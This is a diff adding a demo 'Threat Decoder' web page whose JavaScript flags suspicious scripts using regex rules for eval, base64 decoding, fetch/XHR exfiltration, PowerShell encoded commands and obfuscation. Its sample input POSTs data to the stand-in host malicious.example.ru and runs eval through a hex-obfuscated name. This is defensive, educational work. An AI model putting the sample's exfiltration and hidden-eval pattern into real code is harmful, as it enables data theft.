@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Cybersecurity Threat Decoder (Demo)</title>
+  <link rel="stylesheet" href="/dist/output.css" />
+</head>
+<body class="bg-gray-50">
+  <main class="container mx-auto px-6 py-10">
+    <div class="terminal-panel">
+      <div class="terminal-bar">
+        <div class="terminal-dots" aria-hidden="true">
+          <span class="terminal-dot"></span>
+          <span class="terminal-dot"></span>
+          <span class="terminal-dot"></span>
+        </div>
+        <div class="terminal-title">THREAT DECODER</div>
+        <a class="btn-secondary w-full sm:w-auto text-center" href="/projects/threat_decoder">Back to project</a>
+      </div>
+      <div class="terminal-body">
+        <p class="text-gray-600">Paste suspicious/obfuscated scripts. The tool highlights patterns and explains why they matter.</p>
+
+        <section class="mt-6 grid lg:grid-cols-2 gap-6">
+          <div class="bg-white rounded-2xl shadow-lg p-5">
+            <div class="flex items-center justify-between gap-3 flex-wrap">
+              <h2 class="text-xl font-semibold">Input</h2>
+              <div class="flex gap-3 flex-wrap">
+                <button id="sample" class="btn-secondary">Load sample</button>
+                <button id="clear" class="btn-secondary">Clear</button>
+              </div>
+            </div>
+            <textarea id="code" class="mt-4 w-full px-4 py-3 rounded-2xl bg-gray-50 border border-gray-200 focus:outline-none" rows="14" placeholder="Paste code here..."></textarea>
+            <div class="mt-4 flex flex-wrap gap-3">
+              <button id="analyze" class="btn-primary">Analyze</button>
+              <button id="copy-report" class="btn-secondary">Copy report</button>
+            </div>
+            <div id="summary" class="mt-4 text-gray-600"></div>
+          </div>
+
+          <div class="bg-white rounded-2xl shadow-lg p-5">
+            <h2 class="text-xl font-semibold">Findings</h2>
+            <div id="findings" class="mt-4 space-y-3"></div>
+            <pre id="report" class="mt-4 p-4 rounded-2xl bg-gray-50 border border-gray-200 text-sm overflow-auto" style="max-height: 260px;"></pre>
+          </div>
+        </section>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    const elCode = document.getElementById('code');
+    const elAnalyze = document.getElementById('analyze');
+    const elFindings = document.getElementById('findings');
+    const elReport = document.getElementById('report');
+    const elSummary = document.getElementById('summary');
+    const elSample = document.getElementById('sample');
+    const elClear = document.getElementById('clear');
+    const elCopy = document.getElementById('copy-report');
+
+    const RULES = [
+      {
+        id: 'eval',
+        label: 'Dynamic execution (eval/new Function)',
+        severity: 'high',
+        patterns: [/\beval\s*\(/i, /\bnew\s+Function\b/i],
+        why: 'Dynamic execution can run attacker-controlled code and is common in obfuscated payloads.',
+      },
+      {
+        id: 'base64',
+        label: 'Base64 decode (atob/fromCharCode)',
+        severity: 'medium',
+        patterns: [/\batob\s*\(/i, /fromCharCode\s*\(/i],
+        why: 'Base64/charcode decoding is often used to hide strings and URLs.',
+      },
+      {
+        id: 'network',
+        label: 'Network exfiltration (fetch/XHR/WebSocket)',
+        severity: 'high',
+        patterns: [/\bfetch\s*\(/i, /XMLHttpRequest/i, /\bWebSocket\b/i],
+        why: 'May indicate data exfiltration or remote payload retrieval.',
+      },
+      {
+        id: 'powershell',
+        label: 'PowerShell hints',
+        severity: 'high',
+        patterns: [/powershell/i, /-enc\b/i, /IEX\b/i],
+        why: 'PowerShell encoded commands are a common malware delivery technique.',
+      },
+      {
+        id: 'suspicious-urls',
+        label: 'Suspicious URL patterns',
+        severity: 'medium',
+        patterns: [/https?:\/\//i, /\.ru\b/i, /pastebin\./i],
+        why: 'Hard-coded URLs can be command-and-control endpoints or tracking beacons.',
+      },
+      {
+        id: 'obfuscation',
+        label: 'Obfuscation signals',
+        severity: 'low',
+        patterns: [/\\x[0-9a-f]{2}/i, /[A-Za-z0-9+/]{80,}={0,2}/],
+        why: 'Hex escapes and long high-entropy blobs often indicate obfuscation or packed payloads.',
+      },
+    ];
+
+    function classifyScore(findings) {
+      const weights = { high: 4, medium: 2, low: 1 };
+      return findings.reduce((sum, f) => sum + (weights[f.severity] || 0), 0);
+    }
+
+    function badge(sev) {
+      const base = 'chip';
+      const label = sev.toUpperCase();
+      return `<span class="${base}">${label}</span>`;
+    }
+
+    function analyze(text) {
+      const hits = [];
+      RULES.forEach((rule) => {
+        const matched = rule.patterns.some((re) => re.test(text));
+        if (matched) hits.push(rule);
+      });
+      return hits;
+    }
+
+    function render(text) {
+      const hits = analyze(text);
+      const score = classifyScore(hits);
+
+      elFindings.innerHTML = '';
+
+      const level = score >= 8 ? 'High' : score >= 4 ? 'Medium' : hits.length ? 'Low' : 'None';
+      elSummary.innerHTML = `Risk estimate: <span class="font-semibold">${level}</span> (score ${score})`;
+
+      if (hits.length === 0) {
+        elFindings.innerHTML = '<div class="text-gray-600">No suspicious patterns detected by this simple ruleset.</div>';
+      } else {
+        hits.forEach((h) => {
+          const card = document.createElement('div');
+          card.className = 'bg-gray-50 border border-gray-200 rounded-2xl p-4';
+          card.innerHTML = `
+            <div class="flex items-center justify-between gap-3 flex-wrap">
+              <div class="font-semibold">${h.label}</div>
+              ${badge(h.severity)}
+            </div>
+            <div class="mt-2 text-gray-600">${h.why}</div>
+          `;
+          elFindings.appendChild(card);
+        });
+      }
+
+      const report = {
+        analyzedAt: new Date().toISOString(),
+        risk: level,
+        score,
+        findings: hits.map((h) => ({ id: h.id, severity: h.severity, label: h.label, why: h.why })),
+      };
+
+      elReport.textContent = JSON.stringify(report, null, 2);
+    }
+
+    elAnalyze.addEventListener('click', () => render(elCode.value));
+
+    elSample.addEventListener('click', () => {
+      elCode.value = `// Sample (for education only)\nconst payload = atob('aHR0cHM6Ly9leGFtcGxlLmNvbS9wYXlsb2Fk');\nconst url = 'http://malicious.example.ru/collect';\nfetch(url, { method: 'POST', body: payload });\n// Obfuscated\nconst x = "\\x65\\x76\\x61\\x6c";\nthis[x](payload);`;
+      render(elCode.value);
+    });
+
+    elClear.addEventListener('click', () => {
+      elCode.value = '';
+      elFindings.innerHTML = '';
+      elReport.textContent = '';
+      elSummary.textContent = '';
+    });
+
+    elCopy.addEventListener('click', async () => {
+      try {
+        await navigator.clipboard.writeText(elReport.textContent || '');
+        elCopy.textContent = 'Copied';
+        setTimeout(() => (elCopy.textContent = 'Copy report'), 900);
+      } catch {
+        elCopy.textContent = 'Copy failed';
+        setTimeout(() => (elCopy.textContent = 'Copy report'), 1200);
+      }
+    });
+  </script>
+</body>
+</html>
